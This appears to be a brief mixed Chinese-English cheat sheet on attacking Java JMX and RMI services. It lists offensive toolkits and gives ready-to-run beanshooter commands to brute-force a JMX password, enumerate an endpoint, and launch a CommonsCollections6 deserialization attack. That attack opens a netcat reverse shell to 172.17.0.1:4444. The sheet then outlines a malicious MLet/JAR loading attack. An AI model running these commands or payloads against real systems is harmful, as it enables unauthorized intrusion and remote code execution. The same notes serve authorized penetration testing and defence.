# 核心要点

  • siberas/sjet：siberas JMX 利用 toolkit
  • mogwailabs/mjet：MOGWAI LABS JMX 利用 toolkit
  • qtc-de/remote-method-guesser：Java RMI 漏洞 Scanner
  • qtc-de/beanshooter：JMX 枚举 and attacking tool.
  • Bruteforce a 密码 protected JMX service: beanshooter brute 172.17.0.2 1090
  • Enumerate JMX endpoint: beanshooter enum 172.17.0.2 1090
  • Deserialization attacks on a JMX endpoint: beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --username admin -- 密码 admin
  • The JMX server can connect to a http service that is controlled by the attacker
  • The JMX service downloads and loades the JAR files that were referenced in the MLet file, making the malicious MBean available over JMX.
  • The attacker finally invokes methods from the malicious MBean.
